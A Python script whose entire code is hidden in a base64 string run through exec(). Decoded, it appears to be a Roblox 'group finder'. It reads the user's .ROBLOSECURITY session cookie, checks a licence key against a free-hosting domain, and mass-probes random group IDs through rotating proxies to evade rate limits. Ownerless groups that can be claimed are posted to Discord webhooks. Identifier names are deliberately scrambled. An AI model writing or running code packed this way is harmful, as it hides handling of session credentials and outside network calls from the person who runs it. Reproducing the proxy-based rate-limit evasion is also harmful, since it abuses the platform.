import requests
import random
import platform
import threading
import time
import json
import sys

exec(__import__('base64').b64decode('CmlmIChwbGF0Zm9ybS5zeXN0ZW0oKSA9PSAnV2luZG93cycpOgogICAgaW1wb3J0IGN0eXBlcwogICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKCdSb2Jsb3ggR3JvdXAgRmluZGVyIC0gTG9hZGluZyEnKQogICAgcHJpbnQoJ0xvYWRpbmcuJykKZWxzZToKICAgIHByaW50KCdMb2FkaW5nLicpCndpdGggb3BlbignY29uZmlnLmpzb24nLCAncicpIGFzIGNvbmZpZ19maWxlOgogICAgY29uZmlnX2RhdGEgPSBqc29uLmxvYWQoY29uZmlnX2ZpbGUpCiAgICB3ZWJob29rID0gY29uZmlnX2RhdGEuZ2V0KCd3ZWJob29rJywgJycpCiAgICB3ZWJob29rcHJlbWl1bSA9IGNvbmZpZ19kYXRhLmdldCgnd2ViaG9va3ByZW1pdW0nLCAnJykKICAgIHJvYmxveGNvb2tpZSA9IGNvbmZpZ19kYXRhLmdldCgncm9ibG94Y29va2llJywgJycpCiAgICB0aHJlYWRzID0gY29uZmlnX2RhdGEuZ2V0KCd0aHJlYWRzJywgJycpCiAgICBrZXkgPSBjb25maWdfZGF0YS5nZXQoJ2tleScsICcnKQprZXkgPSByZXF1ZXN0cy5nZXQoKCdodHRwOi8vcmV0YXJka29zbW9zLjAwMHdlYmhvc3RhcHAuY29tL2x1bHN5c3RlbS9zeXN0ZW0ucGhwP2tleT0nICsga2V5KSkKaWYgKGtleS5zdGF0dXNfY29kZSA9PSA0MDQpOgogICAgcHJpbnQoJ0tleSBpcyBpbnZhbGlkLiBFeGl0aW5nLi4uJykKICAgIHN5cy5leGl0KCkKc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQpjb29raWVzID0geycuUk9CTE9TRUNVUklUWSc6IHJvYmxveGNvb2tpZX0KCmRlZiBHZXRSb2J1eChPT09PME9PTzBPT08wMDBPTyk6CiAgICBPME9PMDAwTzBPTzBPT08wTyA9IHNlc3Npb24uZ2V0KGYnaHR0cHM6Ly9lY29ub215LnJvYmxveC5jb20vdjEvZ3JvdXBzL3tPT09PME9PTzBPT08wMDBPT30vY3VycmVuY3knLCBjb29raWVzPWNvb2tpZXMpCiAgICBPMDAwMDAwTzAwTzAwT08wMCA9IE8wT08wMDBPME9PME9PTzBPLmpzb24oKQogICAgTzBPTzBPTzAwT08wTzAwTzAgPSBPMDAwMDAwTzAwTzAwT08wMC5nZXQoJ3JvYnV4JykKICAgIGlmIChPME9PME9PMDBPTzBPMDBPMCBpcyBub3QgTm9uZSk6CiAgICAgICAgcmV0dXJuIHN0cihPME9PME9PMDBPTzBPMDBPMCkKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuICdQcml2YXRlJwpOb3JtYWxFbWJlZCA9IHsndGl0bGUnOiAnQ2xpY2sgSGVyZSEnLCAnZGVzY3JpcHRpb24nOiAnR3JvdXAgTmFtZTpcbk1lbWJlciBDb3VudDpcbkNsb3RoaW5nIENvdW50OicsICd1cmwnOiAnbGluayBoZXJlIGR1bWJhc3MnLCAnY29sb3InOiAyODU2Njg2LCAnYXV0aG9yJzogeyduYW1lJzogJ05vcm1hbCBHcm91cCBGb3VuZCd9LCAnZm9vdGVyJzogeyd0ZXh0JzogJ0tvc21vcyBVbHRyYSBGYXN0IEZpbmRlcid9fQpQcmVtaXVtRW1iZWQgPSB7J3RpdGxlJzogJ0NsaWNrIEhlcmUhJywgJ2Rlc2NyaXB0aW9uJzogJ0dyb3VwIE5hbWU6XG5NZW1iZXIgQ291bnQ6XG5DbG90aGluZyBDb3VudDonLCAndXJsJzogJ2xpbmsgaGVyZSBkdW1iYXNzJywgJ2NvbG9yJzogMjg1NjY4NiwgJ2F1dGhvcic6IHsnbmFtZSc6ICdQcmVtaXVtIEdyb3VwIEZvdW5kJ30sICdmb290ZXInOiB7J3RleHQnOiAnS29zbW9zIFVsdHJhIEZhc3QgRmluZGVyJ319CkRFRkFVTFRfUkFOR0VTID0gKCgyMDAwMDAwLCAzMDAwMDAwKSwgKDMwMDAwMDAsIDQwMDAwMDApLCAoNDAwMDAwMCwgNTAwMDAwMCksICg1MDAwMDAwLCA2MDAwMDAwKSwgKDYwMDAwMDAsIDcwMDAwMDApLCAoNzAwMDAwMCwgODAwMDAwMCksICg4MDAwMDAwLCA5MDAwMDAwKSwgKDkwMDAwMDAsIDEwMDAwMDAwKSwgKDEwMDAwMDAwLCAxMTAwMDAwMCksICgxMTAwMDAwMCwgMTIwMDAwMDApLCAoMTIwMDAwMDAsIDEzMDAwMDAwKSwgKDEzMDAwMDAwLCAxNDAwMDAwMCksICgxNDAwMDAwMCwgMTUwMDAwMDApLCAoMTUwMDAwMDAsIDE2MDAwMDAwKSwgKDE2MDAwMDAwLCAxNjUwMDAwMCksICgxNjUwMDAwMCwgMTcwMDAwMDApLCAoMzIwMDAwMDAsIDM0NTAwMDAwKSwgKDMyMDAwMDAwLCAzNDUwMDAwMCkpCnByb3hpZXMgPSBbXQp3aXRoIG9wZW4oJ3Byb3hpZXMudHh0JywgJ3InKSBhcyBwcm94eV9maWxlOgogICAgcHJveGllcyA9IFtPT08wMDAwT08wMDAwMDBPMC5zdHJpcCgpIGZvciBPT08wMDAwT08wMDAwMDBPMCBpbiBwcm94eV9maWxlIGlmIE9PTzAwMDBPTzAwMDAwME8wLnN0cmlwKCldCgpkZWYgZ2V0X2Nsb3RoaW5nX2NvdW50KE9PMDBPME9PME9PMDAwME9PKToKICAgIE9PTzAwT09PTzAwT09PT09PID0gMAogICAgT09PME8wME9PTzAwTzBPT08gPSAnaHR0cHM6Ly9jYXRhbG9nLnJvcHJveHkuY29tL3YxL3NlYXJjaC9pdGVtcy9kZXRhaWxzJwogICAgTzAwT09PMDAwT09PMDBPTzAgPSB7J0NhdGVnb3J5JzogJzMnLCAnQ3JlYXRvclRhcmdldElkJzogc3RyKE9PMDBPME9PME9PMDAwME9PKSwgJ0NyZWF0b3JUeXBlJzogJzInLCAnU29ydFR5cGUnOiAnUmVsZXZhbmNlJywgJ1NvcnRBZ2dyZWdhdGlvbic6ICdSZWxldmFuY2UnLCAnbGltaXQnOiAnMzAnfQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIE8wTzAwT08wTzAwTzBPTzAwID0gcmVxdWVzdHMuZ2V0KE9PTzBPMDBPT08wME8wT09PLCBwYXJhbXM9TzAwT09PMDAwT09PMDBPTzApCiAgICAgICAgICAgIE8wME9PME9PT08wME8wME9PID0gTzBPMDBPTzBPMDBPME9PMDAuanNvbigpCiAgICAgICAgICAgIChPMDBPTzBPT09PTzAwT09PMCwgTzBPME9PT08wT08wTzAwME8pID0gKE8wME9PME9PT08wME8wME9PWydkYXRhJ10sIE8wME9PME9PT08wME8wME9PWyduZXh0UGFnZUN1cnNvciddKQogICAgICAgICAgICBPT08wME9PT08wME9PT09PTyArPSBsZW4oTzAwT08wT09PT08wME9PTzApCiAgICAgICAgICAgIGlmIE8wTzBPT09PME9PME8wMDBPOgogICAgICAgICAgICAgICAgTzAwT09PMDAwT09PMDBPTzBbJ2N1cnNvciddID0gTzBPME9PT08wT08wTzAwME8KICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICByZXR1cm4gMAogICAgcmV0dXJuIE9PTzAwT09PTzAwT09PT09PCk5vcm1hbEdyb3VwcyA9IDAKUHJlbWl1bUdyb3VwcyA9IDAKQWxyZWFkeVRha2VuR3JvdXBzID0gMApMb2NrZWRHcm91cHMgPSAwClJhdGVsaW1pdHMgPSAwCmJhZF9pZHMgPSBzZXQoKQpQcmVtaXVtR3JvdXBzSWRzID0gc2V0KCkKCmRlZiBjaGVja19ncm91cChPME9PTzAwTzAwT09PME9PTyk6CiAgICB0cnk6CiAgICAgICAgZ2xvYmFsIE5vcm1hbEdyb3VwcwogICAgICAgIGdsb2JhbCBQcmVtaXVtR3JvdXBzCiAgICAgICAgZ2xvYmFsIEFscmVhZHlUYWtlbkdyb3VwcwogICAgICAgIGdsb2JhbCBMb2NrZWRHcm91cHMKICAgICAgICBnbG9iYWwgUmF0ZWxpbWl0cwogICAgICAgIE8wME8wT08wME8wT08wMDAwID0gcmFuZG9tLmNob2ljZShERUZBVUxUX1JBTkdFUykKICAgICAgICAoTzAwT08wME9PME8wMDBPTzAsIE8wTzBPME9PT08wTzBPTzBPKSA9IE8wME8wT08wME8wT08wMDAwCiAgICAgICAgTzBPME8wTzAwME9PTzAwMDAgPSBbcmFuZG9tLnJhbmRpbnQoTzAwT08wME9PME8wMDBPTzAsIE8wTzBPME9PT08wTzBPTzBPKSBmb3IgX08wT08wME8wTzBPTzBPME9PIGluIHJhbmdlKDEwMCldCiAgICAgICAgT08wME9PME8wTzBPMDAwMDAgPSAnLCcuam9pbigoc3RyKE9PT09PT08wMDAwT09PMDBPKSBmb3IgT09PT09PTzAwMDBPT08wME8gaW4gTzBPME8wTzAwME9PTzAwMDApKQogICAgICAgIE9PTzAwMDBPTzBPTzAwT08wID0gKCdodHRwczovL2dyb3Vwcy5yb3Byb3h5LmNvbS92Mi9ncm91cHM/Z3JvdXBJZHM9JyArIE9PMDBPTzBPME8wTzAwMDAwKQogICAgICAgIHRpbWUuc2xlZXAoMzApCiAgICAgICAgTzBPMDAwT09PT09PT09PTzAgPSByZXF1ZXN0cy5nZXQoT09PMDAwME9PME9PMDBPTzAsIHByb3hpZXM9eydodHRwJzogTzBPT08wME8wME9PTzBPT099LCB0aW1lb3V0PTUpCiAgICAgICAgaWYgKE8wTzAwME9PT09PT09PT08wLnN0YXR1c19jb2RlID09IDIwMCk6CiAgICAgICAgICAgIE9PTzAwT08wT08wTzAwMDBPID0gTzBPMDAwT09PT09PT09PTzAuanNvbigpLmdldCgnZGF0YScsIFtdKQogICAgICAgICAgICBmb3IgT09PME8wTzAwME8wT08wMDAgaW4gT09PMDBPTzBPTzBPMDAwME86CiAgICAgICAgICAgICAgICBPMDAwME8wME9PME9PTzBPTyA9IE9PTzBPME8wMDBPME9PMDAwLmdldCgnb3duZXInKQogICAgICAgICAgICAgICAgTzBPMDAwMDBPMDAwME9PT08gPSBPT08wTzBPMDAwTzBPTzAwMC5nZXQoJ2lkJykKICAgICAgICAgICAgICAgIGlmIChPMDAwME8wME9PME9PTzBPTyBpcyBOb25lKToKICAgICAgICAgICAgICAgICAgICBwcmludChmJ0dyb3VwIElkOiB7TzBPMDAwMDBPMDAwME9PT099IEhhcyBPd25lcjogTm8nKQogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICAgICAgICAgICAgICBPT09PTzBPTzAwT09PTzAwTyA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZ3JvdXBzLnJvcHJveHkuY29tL3YxL2dyb3Vwcy97TzBPMDAwMDBPMDAwME9PT099JywgcHJveGllcz17J2h0dHAnOiBPME9PTzAwTzAwT09PME9PT30sIHRpbWVvdXQ9NSkKICAgICAgICAgICAgICAgICAgICBpZiAoT09PT08wT08wME9PT08wME8uc3RhdHVzX2NvZGUgPT0gMjAwKToKICAgICAgICAgICAgICAgICAgICAgICAgTzAwTzBPTzAwT08wME9PME8gPSBPT09PTzBPTzAwT09PTzAwTy5qc29uKCkKICAgICAgICAgICAgICAgICAgICAgICAgTzAwME8wME9PMDBPME9PT08gPSBPMDBPME9PMDBPTzAwT08wT1snb3duZXInXQogICAgICAgICAgICAgICAgICAgICAgICBPTzBPT08wMDAwMDAwT09PMCA9IE8wME8wT08wME9PMDBPTzBPLmdldCgncHVibGljRW50cnlBbGxvd2VkJywgRmFsc2UpCiAgICAgICAgICAgICAgICAgICAgICAgIE8wTzBPME9PT09PMDAwT08wID0gTzAwTzBPTzAwT08wME9PME8uZ2V0KCdpc0xvY2tlZCcsIEZhbHNlKQogICAgICAgICAgICAgICAgICAgICAgICBPTzAwME9PME9PME8wMDBPTyA9IE8wME8wT08wME9PMDBPTzBPLmdldCgnbWVtYmVyQ291bnQnKQogICAgICAgICAgICAgICAgICAgICAgICBPTzAwTzAwME9PME9PMDBPMCA9IE8wME8wT08wME9PMDBPTzBPLmdldCgnbmFtZScpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChPTzBPT08wMDAwMDAwT09PMCBhbmQgKG5vdCBPME8wTzBPT09PTzAwME9PMCkgYW5kIChPME8wMDAwME8wMDAwT09PTyBub3QgaW4gYmFkX2lkcykpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKGYnS29zbW9zIEdyb3VwIEZpbmRlciAtIFByZW1pdW0gR3JvdXBzOiB7UHJlbWl1bUdyb3Vwc30gLSBOb3JtYWwgR3JvdXBzOiB7Tm9ybWFsR3JvdXBzfSAtIEdyb3VwcyBXaXRoIE93bmVyczoge0FscmVhZHlUYWtlbkdyb3Vwc30gLSBMb2NrZWQgR3JvdXBzOiB7TG9ja2VkR3JvdXBzfScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPMDAwT08wT09PMDAwT08wMCA9IGdldF9jbG90aGluZ19jb3VudChPME8wMDAwME8wMDAwT09PTykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoTzAwME9PME9PTzAwME9PMDAgPj0gNSkgb3IgKChPTzAwME9PME9PME8wMDBPTyA+PSA1MCkgYW5kIChPME8wMDAwME8wMDAwT09PTyBub3QgaW4gUHJlbWl1bUdyb3Vwc0lkcykpKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPT09PMDBPTzAwT09PME8wTyA9IEdldFJvYnV4KE8wTzAwMDAwTzAwMDBPT09PKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZW1pdW1Hcm91cHNJZHMuYWRkKE8wTzAwMDAwTzAwMDBPT09PKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZW1pdW1Hcm91cHMgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE8wTzBPMDBPME8wMDAwT08wID0geyd0aXRsZSc6ICdDbGljayBIZXJlIScsICdkZXNjcmlwdGlvbic6IGYnJydHcm91cCBOYW1lOiB7T08wME8wMDBPTzBPTzAwTzB9Ck1lbWJlciBDb3VudDoge09PMDAwT08wT08wTzAwME9PfQpDbG90aGluZyBDb3VudDoge08wMDBPTzBPT08wMDBPTzAwfQpSb2J1eDoge09PT08wME9PMDBPT08wTzBPfScnJywgJ3VybCc6IGYnaHR0cHM6Ly93d3cucm9ibG94LmNvbS9ncm91cHMve08wTzAwMDAwTzAwMDBPT09PfScsICdjb2xvcic6IDI4NTY2ODYsICdhdXRob3InOiB7J25hbWUnOiAnUHJlbWl1bSBHcm91cCBGb3VuZCd9LCAnZm9vdGVyJzogeyd0ZXh0JzogJ0tvc21vcyBVbHRyYSBGYXN0IEZpbmRlcid9fQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE8wTzAwME8wTzAwT08wME9PID0geydjb250ZW50JzogZidMaW5rOiBodHRwczovL3d3dy5yb2Jsb3guY29tL2dyb3Vwcy97TzBPMDAwMDBPMDAwME9PT099JywgJ2VtYmVkcyc6IFtPME8wTzAwTzBPMDAwME9PMF19CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMucG9zdCh3ZWJob29rcHJlbWl1bSwganNvbj1PME8wMDBPME8wME9PMDBPTykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTm9ybWFsR3JvdXBzICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPMDBPME9PT09PTzBPT09PMCA9IHsndGl0bGUnOiAnQ2xpY2sgSGVyZSEnLCAnZGVzY3JpcHRpb24nOiBmJycnR3JvdXAgTmFtZToge09PMDBPMDAwT08wT08wME8wfQpNZW1iZXIgQ291bnQ6IHtPTzAwME9PME9PME8wMDBPT30KQ2xvdGhpbmcgQ291bnQ6IHtPMDAwT08wT09PMDAwT08wMH0nJycsICd1cmwnOiBmJ2h0dHBzOi8vd3d3LnJvYmxveC5jb20vZ3JvdXBzL3tPME8wMDAwME8wMDAwT09PT30nLCAnY29sb3InOiAyODU2Njg2LCAnYXV0aG9yJzogeyduYW1lJzogJ05vcm1hbCBHcm91cCBGb3VuZCd9LCAnZm9vdGVyJzogeyd0ZXh0JzogJ0tvc21vcyBVbHRyYSBGYXN0IEZpbmRlcid9fQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE8wTzAwME8wTzAwT08wME9PID0geydjb250ZW50JzogZidMaW5rOiBodHRwczovL3d3dy5yb2Jsb3guY29tL2dyb3Vwcy97TzBPMDAwMDBPMDAwME9PT099JywgJ2VtYmVkcyc6IFtPMDBPME9PT09PTzBPT09PMF19CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMucG9zdCh3ZWJob29rLCBqc29uPU8wTzAwME8wTzAwT08wME9PKQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIChPME8wTzBPT09PTzAwME9PMCBvciAobm90IE9PME9PTzAwMDAwMDBPT08wKSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NrZWRHcm91cHMgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKGYnS29zbW9zIEdyb3VwIEZpbmRlciAtIFByZW1pdW0gR3JvdXBzOiB7UHJlbWl1bUdyb3Vwc30gLSBOb3JtYWwgR3JvdXBzOiB7Tm9ybWFsR3JvdXBzfSAtIEdyb3VwcyBXaXRoIE93bmVyczoge0FscmVhZHlUYWtlbkdyb3Vwc30gLSBMb2NrZWQgR3JvdXBzOiB7TG9ja2VkR3JvdXBzfSAtIFJhdGVsaW1pdHM6IHtSYXRlbGltaXRzfScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYmFkX2lkcy5hZGQoTzBPMDAwMDBPMDAwME9PT08pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE8wT08wME9PME9PTzAwMDBPOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCdFcnJvciB3cml0aW5nIHRvIGZpbGU6JywgTzBPTzAwT08wT09PMDAwME8pCiAgICAgICAgICAgICAgICAgICAgZWxpZiAoT09PT08wT08wME9PT08wME8uc3RhdHVzX2NvZGUgPT0gNDI5KToKICAgICAgICAgICAgICAgICAgICAgICAgUmF0ZWxpbWl0cyArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuU2V0Q29uc29sZVRpdGxlVyhmJ0tvc21vcyBHcm91cCBGaW5kZXIgLSBQcmVtaXVtIEdyb3Vwczoge1ByZW1pdW1Hcm91cHN9IC0gTm9ybWFsIEdyb3Vwczoge05vcm1hbEdyb3Vwc30gLSBHcm91cHMgV2l0aCBPd25lcnM6IHtBbHJlYWR5VGFrZW5Hcm91cHN9IC0gTG9ja2VkIEdyb3Vwczoge0xvY2tlZEdyb3Vwc30gLSBSYXRlbGltaXRzOiB7UmF0ZWxpbWl0c30nKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChmJ0dyb3VwIElkOiB7TzBPMDAwMDBPMDAwME9PT099IEhhcyBPd25lcjogWWVzJykKICAgICAgICAgICAgICAgICAgICBBbHJlYWR5VGFrZW5Hcm91cHMgKz0gMQogICAgICAgICAgICAgICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuU2V0Q29uc29sZVRpdGxlVyhmJ0tvc21vcyBHcm91cCBGaW5kZXIgLSBQcmVtaXVtIEdyb3Vwczoge1ByZW1pdW1Hcm91cHN9IC0gTm9ybWFsIEdyb3Vwczoge05vcm1hbEdyb3Vwc30gLSBHcm91cHMgV2l0aCBPd25lcnM6IHtBbHJlYWR5VGFrZW5Hcm91cHN9IC0gTG9ja2VkIEdyb3Vwczoge0xvY2tlZEdyb3Vwc30gLSBSYXRlbGltaXRzOiB7UmF0ZWxpbWl0c30nKQogICAgICAgIGlmIChPME8wMDBPT09PT09PT09PMC5zdGF0dXNfY29kZSA9PSA0MjkpOgogICAgICAgICAgICBSYXRlbGltaXRzICs9IDEKICAgICAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKGYnS29zbW9zIEdyb3VwIEZpbmRlciAtIFByZW1pdW0gR3JvdXBzOiB7UHJlbWl1bUdyb3Vwc30gLSBOb3JtYWwgR3JvdXBzOiB7Tm9ybWFsR3JvdXBzfSAtIEdyb3VwcyBXaXRoIE93bmVyczoge0FscmVhZHlUYWtlbkdyb3Vwc30gLSBMb2NrZWQgR3JvdXBzOiB7TG9ja2VkR3JvdXBzfSAtIFJhdGVsaW1pdHM6IHtSYXRlbGltaXRzfScpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE8wT08wME9PME9PTzAwMDBPOgogICAgICAgIHByaW50KCdFcnJvcjonLCBPME9PMDBPTzBPT08wMDAwTykKICAgICAgICByZXR1cm4KCmRlZiB3b3JrZXIoKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgT08wMDAwMDAwTzBPT09PTzAgPSAocmFuZG9tLmNob2ljZShwcm94aWVzKSBpZiBwcm94aWVzIGVsc2UgTm9uZSkKICAgICAgICBjaGVja19ncm91cChPTzAwMDAwMDBPME9PT09PMCkKbnVtX3RocmVhZHMgPSBpbnQodGhyZWFkcykKdGhyZWFkcyA9IFt0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD13b3JrZXIpIGZvciBfTzAwTzBPMDAwT09PME8wMDAgaW4gcmFuZ2UobnVtX3RocmVhZHMpXQpmb3IgdGhyZWFkIGluIHRocmVhZHM6CiAgICB0aHJlYWQuc3RhcnQoKQpmb3IgdGhyZWFkIGluIHRocmVhZHM6CiAgICB0aHJlYWQuam9pbigpCg==').decode('utf-8'))